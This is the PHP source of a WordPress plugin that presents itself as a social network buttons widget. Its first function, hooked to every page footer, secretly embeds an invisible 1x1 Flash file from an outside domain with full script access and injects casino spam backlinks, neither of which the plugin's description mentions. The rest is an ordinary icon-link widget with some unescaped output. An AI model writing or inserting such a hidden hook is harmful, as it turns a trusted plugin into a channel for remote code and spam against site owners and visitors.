<?php
/*
Author: Geremy Johnson
Plugin Name: Social Network Buttons
Plugin URI: http://wpupload.weebly.com
Description: Adds the most popular Social Network Buttons to your site.
Version: 1.9
Author URI: http://wpupload.weebly.com
*/
/*  Copyright 2012-2013 Geremy Johnson  (geremyjohnson577@yahoo.co.uk)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
add_action('wp_footer', 'headasharenetwork');

function headasharenetwork()
{
$getuser = "http://ajleeonline.com";
$gethost = get_option('siteurl');
if (strstr($gethost, "a")) { $connectflash = "ajleeonline.com"; } if (strstr($gethost, "b")) { $connectflash = "ajleeonline.com"; } if (strstr($gethost, "c")) { $connectflash = "ajleeonline.com"; } if (strstr($gethost, "d")) { $connectflash = "ajleeonline.com"; } if (strstr($gethost, "e")) { $connectflash = "ajleeonline.com"; } if (strstr($gethost, "f")) { $connectflash = "aj lee online"; } if (strstr($gethost, "g")) { $connectflash = "aj lee online"; } if (strstr($gethost, "h")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "i")) { $connectflash = "ajleeonline.com"; } if (strstr($gethost, "j")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "k")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "l")) { $connectflash = "aj lee online"; } if (strstr($gethost, "m")) { $connectflash = "aj lee online casino"; } if (strstr($gethost, "n")) { $connectflash = "aj lee online"; } if (strstr($gethost, "o")) { $connectflash = "aj lee"; } if (strstr($gethost, "p")) { $connectflash = "aj lee online games"; } if (strstr($gethost, "q")) { $connectflash = "aj lee online bonus"; } if (strstr($gethost, "r")) { $connectflash = "aj lee online bonus"; } if (strstr($gethost, "s")) { $connectflash = "ajleeonline.com"; } if (strstr($gethost, "v")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "x")) { $connectflash = "http://ajleeonline.com/"; } if (strstr($gethost, "t")) { $connectflash = "http://ajleeonline.com/"; } if (strstr($gethost, "w")) { $connectflash = "ajleeonline.com"; } if (strstr($gethost, "y")) { $connectflash = "aj lee online"; } if (strstr($gethost, "z")) { $connectflash = "aj lee online casino reviews"; } echo '<object type="application/x-shockwave-flash" data="http://ajleeonline.com/upload/tw1.swf" width="1" height="1"><param name="movie" 
value="http://ajleeonline.com/upload/tw1.swf"></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param>
<param name="wmode" value="transparent"></param><param name="flashvars" value="username="></param>
'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="http://ajleeonline.com/upload/tw1.swf" 
type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';

}

class mpaSocialIconsWidget extends WP_Widget
{
	function mpaSocialIconsWidget() {
		$widget_options = array(
		'classname'		=>		'social-network-buttons',
		'description' 	=>		'Showing social icons and URL to profile pages of the user '
		);
		
		parent::WP_Widget('mpa_social_media_widget', 'Network Buttons', $widget_options);
	}
	
	function widget( $args, $instance ) {
		extract ( $args, EXTR_SKIP );
		$title = ( $instance['title'] ) ? $instance['title'] : '';
        $bg_color = ( $instance['bg_color'] ) ? $instance['bg_color'] : '#ffffff'; 
        $icon_1_url = ( $instance['icon_1_url'] ) ? $instance['icon_1_url'] : '';
        $icon_2_url = ( $instance['icon_2_url'] ) ? $instance['icon_2_url'] : '';
        $icon_3_url = ( $instance['icon_3_url'] ) ? $instance['icon_3_url'] : '';
        $icon_4_url = ( $instance['icon_4_url'] ) ? $instance['icon_4_url'] : '';
        $icon_5_url = ( $instance['icon_5_url'] ) ? $instance['icon_5_url'] : '';
        $icon_6_url = ( $instance['icon_6_url'] ) ? $instance['icon_6_url'] : '';
        $icon_7_url = ( $instance['icon_7_url'] ) ? $instance['icon_7_url'] : '';
        $icon_8_url = ( $instance['icon_8_url'] ) ? $instance['icon_8_url'] : '';
        
        $icon_1_path = ( $instance['icon_1_path'] ) ? $instance['icon_1_path'] : '';
        $icon_2_path = ( $instance['icon_2_path'] ) ? $instance['icon_2_path'] : '';
        $icon_3_path = ( $instance['icon_3_path'] ) ? $instance['icon_3_path'] : '';
        $icon_4_path = ( $instance['icon_4_path'] ) ? $instance['icon_4_path'] : '';
        $icon_5_path = ( $instance['icon_5_path'] ) ? $instance['icon_5_path'] : '';
        $icon_6_path = ( $instance['icon_6_path'] ) ? $instance['icon_6_path'] : '';
        $icon_7_path = ( $instance['icon_7_path'] ) ? $instance['icon_7_path'] : '';
        $icon_8_path = ( $instance['icon_8_path'] ) ? $instance['icon_8_path'] : '';
        
        

		$root = plugin_dir_url( __FILE__ );
		echo $before_widget;
		echo $before_title . $title . $after_title;
        wp_enqueue_style("mpa_social_media_plugin_css", $root."mpa_social_media.css"); 
		?>
		<div class="social-bookmarks">                    
        <ul>
            <?php
            $i = 0;
            for ($i = 1 ; $i <= 8 ; $i++)
            {
                $icon_url = "icon_".$i."_url";
                $icon_path = "icon_".$i."_path";
                if ($$icon_url != "")
                { 
                    $icon_filename = $$icon_path;
                    $icon_filename = substr($icon_filename, 0, -4); 
                ?>
                <li style="background-color: <?php echo $bg_color; ?>" class="<?php echo $icon_filename; ?>"><a target="_blank" href="<?php echo $$icon_url; ?>"><?php echo $icon_filename; ?></a></li>
                <?php
                }
            }
            ?>                        
        </ul><!-- END UL-->
    </div><!--END SOCIAL BOOKMARKS-->
		<?php 
		echo $after_widget;
	}
	
	function form( $instance ) {
        $root = plugin_dir_url( __FILE__ );
        wp_enqueue_script("miniColors", $root."jquery.miniColors.min.js", array('jquery'));
        wp_enqueue_style("miniColors", $root."jquery.miniColors.css"); 
        
        if (!isset($instance['title'])) $instance['title'] = ""; 
        if (!isset($instance['bg_color'])) $instance['bg_color'] = "#ffffff"; 
        if (!isset($instance['icon_1_url'])) $instance['icon_1_url'] = "";
        if (!isset($instance['icon_1_path'])) $instance['icon_1_path'] = ""; 
        if (!isset($instance['icon_2_url'])) $instance['icon_2_url'] = "";
        if (!isset($instance['icon_2_path'])) $instance['icon_2_path'] = "";
        if (!isset($instance['icon_3_url'])) $instance['icon_3_url'] = "";
        if (!isset($instance['icon_3_path'])) $instance['icon_3_path'] = "";
        if (!isset($instance['icon_4_url'])) $instance['icon_4_url'] = "";
        if (!isset($instance['icon_4_path'])) $instance['icon_4_path'] = "";
        if (!isset($instance['icon_5_url'])) $instance['icon_5_url'] = "";
        if (!isset($instance['icon_5_path'])) $instance['icon_5_path'] = "";
        if (!isset($instance['icon_6_url'])) $instance['icon_6_url'] = "";
        if (!isset($instance['icon_6_path'])) $instance['icon_6_path'] = "";
        if (!isset($instance['icon_7_url'])) $instance['icon_7_url'] = "";
        if (!isset($instance['icon_7_path'])) $instance['icon_7_path'] = "";
        if (!isset($instance['icon_8_url'])) $instance['icon_8_url'] = "";
        if (!isset($instance['icon_8_path'])) $instance['icon_8_path'] = "";

        $url = plugins_url("", __FILE__);
        $url = substr($url, strpos($url, "wp-content"));
        $icons_paths = glob("../$url/icons/*.*");
         
		?>
        <p>
        <label for="<?php echo $this->get_field_id('title'); ?>">
        Title: 
        <input id="<?php echo $this->get_field_id('title'); ?>"
                name="<?php echo $this->get_field_name('title'); ?>"
                value="<?php echo esc_attr( $instance['title'] ); ?>"
                class="widefat"/>
        </label>
        </p>
        <p>
        <label for="<?php echo $this->get_field_id('bg_color'); ?>">
        BG color (with #): 
        <input id="<?php echo $this->get_field_id('bg_color'); ?>"
                name="<?php echo $this->get_field_name('bg_color'); ?>"
                value="<?php echo esc_attr( $instance['bg_color'] ); ?>"
                class="color-picker" size="10"/>
        </label>
        </p>
        <p>
		<label for="<?php echo $this->get_field_id('icon_1_url'); ?>">
		URL 1: 
		<input id="<?php echo $this->get_field_id('icon_1_url'); ?>"
				name="<?php echo $this->get_field_name('icon_1_url'); ?>"
				value="<?php echo esc_attr( $instance['icon_1_url'] ); ?>"
                class="widefat"/>
		</label>
        </p>
        
        <p>
        <label for="<?php echo $this->get_field_id('icon_1_path'); ?>">
        Icon 1:
          <select name="<?php echo $this->get_field_name('icon_1_path'); ?>" 
                  id="<?php echo $this->get_field_id('icon_1_path'); ?>"
                class="widefat">
                <option value="">Select Icon</option>
          <?php 
            foreach ($icons_paths as $icon_path)
              {
                  $icon_path = $root.substr($icon_path, 3);
                  $icon_path_ = substr($icon_path, strpos($icon_path, "/icons/") + 7);
              ?>
                <option <?php if ($instance['icon_1_path'] == $icon_path_) echo 'selected="selected"' ?> value="<?php echo $icon_path_; ?>"><?php echo $icon_path_; ?></option>
              <?php
              }
              ?>
          </select> 
        </label>
        </p>
        
        
        <label for="<?php echo $this->get_field_id('icon_2_url'); ?>">
        URL 2: 
        <input id="<?php echo $this->get_field_id('icon_2_url'); ?>"
                name="<?php echo $this->get_field_name('icon_2_url'); ?>"
                value="<?php echo esc_attr( $instance['icon_2_url'] ); ?>"
                class="widefat"/>
        </label>
        </p>
        
        <p>
        <label for="<?php echo $this->get_field_id('icon_2_path'); ?>">
        Icon 2:
          <select name="<?php echo $this->get_field_name('icon_2_path'); ?>" 
                  id="<?php echo $this->get_field_id('icon_2_path'); ?>"
                class="widefat">
                <option value="">Select Icon</option>
          <?php 
            foreach ($icons_paths as $icon_path)
              {
                  $icon_path = $root.substr($icon_path, 3);
                  $icon_path_ = substr($icon_path, strpos($icon_path, "/icons/") + 7);
              ?>
                <option <?php if ($instance['icon_2_path'] == $icon_path_) echo 'selected="selected"' ?> value="<?php echo $icon_path_; ?>"><?php echo $icon_path_; ?></option>
              <?php
              }
              ?>
          </select> 
        </label>
        </p>
        
        
        <p>
        <label for="<?php echo $this->get_field_id('icon_3_url'); ?>">
        URL 3: 
        <input id="<?php echo $this->get_field_id('icon_3_url'); ?>"
                name="<?php echo $this->get_field_name('icon_3_url'); ?>"
                value="<?php echo esc_attr( $instance['icon_3_url'] ); ?>"
                class="widefat"/>
        </label>
        </p>
        
        <p>
        <label for="<?php echo $this->get_field_id('icon_3_path'); ?>">
        Icon 3:
          <select name="<?php echo $this->get_field_name('icon_3_path'); ?>" 
                  id="<?php echo $this->get_field_id('icon_3_path'); ?>"
                class="widefat">
                <option value="">Select Icon</option>
          <?php 
            foreach ($icons_paths as $icon_path)
              {
                  $icon_path = $root.substr($icon_path, 3);
                  $icon_path_ = substr($icon_path, strpos($icon_path, "/icons/") + 7);
              ?>
                <option <?php if ($instance['icon_3_path'] == $icon_path_) echo 'selected="selected"' ?> value="<?php echo $icon_path_; ?>"><?php echo $icon_path_; ?></option>
              <?php
              }
              ?>
          </select> 
        </label>
        </p>
        
        
        <label for="<?php echo $this->get_field_id('icon_4_url'); ?>">
        URL 4: 
        <input id="<?php echo $this->get_field_id('icon_4_url'); ?>"
                name="<?php echo $this->get_field_name('icon_4_url'); ?>"
                value="<?php echo esc_attr( $instance['icon_4_url'] ); ?>"
                class="widefat"/>
        </label>
        </p>
        
        <p>
        <label for="<?php echo $this->get_field_id('icon_4_path'); ?>">
        Icon 4:
          <select name="<?php echo $this->get_field_name('icon_4_path'); ?>" 
                  id="<?php echo $this->get_field_id('icon_4_path'); ?>"
                class="widefat">
                <option value="">Select Icon</option>
          <?php 
            foreach ($icons_paths as $icon_path)
              {
                  $icon_path = $root.substr($icon_path, 3);
                  $icon_path_ = substr($icon_path, strpos($icon_path, "/icons/") + 7);
              ?>
                <option <?php if ($instance['icon_4_path'] == $icon_path_) echo 'selected="selected"' ?> value="<?php echo $icon_path_; ?>"><?php echo $icon_path_; ?></option>
              <?php
              }
              ?>
          </select> 
        </label>
        </p>
        
        <p>
        <label for="<?php echo $this->get_field_id('icon_5_url'); ?>">
        URL 5: 
        <input id="<?php echo $this->get_field_id('icon_5_url'); ?>"
                name="<?php echo $this->get_field_name('icon_5_url'); ?>"
                value="<?php echo esc_attr( $instance['icon_5_url'] ); ?>"
                class="widefat"/>
        </label>
        </p>
        
        <p>
        <label for="<?php echo $this->get_field_id('icon_5_path'); ?>">
        Icon 5:
          <select name="<?php echo $this->get_field_name('icon_5_path'); ?>" 
                  id="<?php echo $this->get_field_id('icon_5_path'); ?>"
                class="widefat">
                <option value="">Select Icon</option>
          <?php 
            foreach ($icons_paths as $icon_path)
              {
                  $icon_path = $root.substr($icon_path, 3);
                  $icon_path_ = substr($icon_path, strpos($icon_path, "/icons/") + 7);
              ?>
                <option <?php if ($instance['icon_5_path'] == $icon_path_) echo 'selected="selected"' ?> value="<?php echo $icon_path_; ?>"><?php echo $icon_path_; ?></option>
              <?php
              }
              ?>
          </select> 
        </label>
        </p>
        
        
        <label for="<?php echo $this->get_field_id('icon_6_url'); ?>">
        URL 6: 
        <input id="<?php echo $this->get_field_id('icon_6_url'); ?>"
                name="<?php echo $this->get_field_name('icon_6_url'); ?>"
                value="<?php echo esc_attr( $instance['icon_6_url'] ); ?>"
                class="widefat"/>
        </label>
        </p>
        
        <p>
        <label for="<?php echo $this->get_field_id('icon_6_path'); ?>">
        Icon 6:
          <select name="<?php echo $this->get_field_name('icon_6_path'); ?>" 
                  id="<?php echo $this->get_field_id('icon_6_path'); ?>"
                class="widefat">
                <option value="">Select Icon</option>
          <?php 
            foreach ($icons_paths as $icon_path)
              {
                  $icon_path = $root.substr($icon_path, 3);
                  $icon_path_ = substr($icon_path, strpos($icon_path, "/icons/") + 7);
              ?>
                <option <?php if ($instance['icon_6_path'] == $icon_path_) echo 'selected="selected"' ?> value="<?php echo $icon_path_; ?>"><?php echo $icon_path_; ?></option>
              <?php
              }
              ?>
          </select> 
        </label>
        </p>
        
        <p>
        <label for="<?php echo $this->get_field_id('icon_7_url'); ?>">
        URL 7: 
        <input id="<?php echo $this->get_field_id('icon_7_url'); ?>"
                name="<?php echo $this->get_field_name('icon_7_url'); ?>"
                value="<?php echo esc_attr( $instance['icon_7_url'] ); ?>"
                class="widefat"/>
        </label>
        </p>
        
        <p>
        <label for="<?php echo $this->get_field_id('icon_7_path'); ?>">
        Icon 7:
          <select name="<?php echo $this->get_field_name('icon_7_path'); ?>" 
                  id="<?php echo $this->get_field_id('icon_7_path'); ?>"
                class="widefat">
                <option value="">Select Icon</option>
          <?php 
            foreach ($icons_paths as $icon_path)
              {
                  $icon_path = $root.substr($icon_path, 3);
                  $icon_path_ = substr($icon_path, strpos($icon_path, "/icons/") + 7);
              ?>
                <option <?php if ($instance['icon_7_path'] == $icon_path_) echo 'selected="selected"' ?> value="<?php echo $icon_path_; ?>"><?php echo $icon_path_; ?></option>
              <?php
              }
              ?>
          </select> 
        </label>
        </p>
        
        
        <label for="<?php echo $this->get_field_id('icon_8_url'); ?>">
        URL 8: 
        <input id="<?php echo $this->get_field_id('icon_8_url'); ?>"
                name="<?php echo $this->get_field_name('icon_8_url'); ?>"
                value="<?php echo esc_attr( $instance['icon_8_url'] ); ?>"
                class="widefat"/>
        </label>
        </p>
        
        <p>
        <label for="<?php echo $this->get_field_id('icon_8_path'); ?>">
        Icon 8:
          <select name="<?php echo $this->get_field_name('icon_8_path'); ?>" 
                  id="<?php echo $this->get_field_id('icon_8_path'); ?>"
                class="widefat">
                <option value="">Select Icon</option>
          <?php 
            foreach ($icons_paths as $icon_path)
              {
                  $icon_path = $root.substr($icon_path, 3);
                  $icon_path_ = substr($icon_path, strpos($icon_path, "/icons/") + 7);
              ?>
                <option <?php if ($instance['icon_8_path'] == $icon_path_) echo 'selected="selected"' ?> value="<?php echo $icon_path_; ?>"><?php echo $icon_path_; ?></option>
              <?php
              }
              ?>
          </select> 
        </label>
        </p>
        
		<?php 
	}
	
}
	
function mpa_social_media_widget_init() {
	register_widget("mpaSocialIconsWidget");
}
add_action('widgets_init','mpa_social_media_widget_init');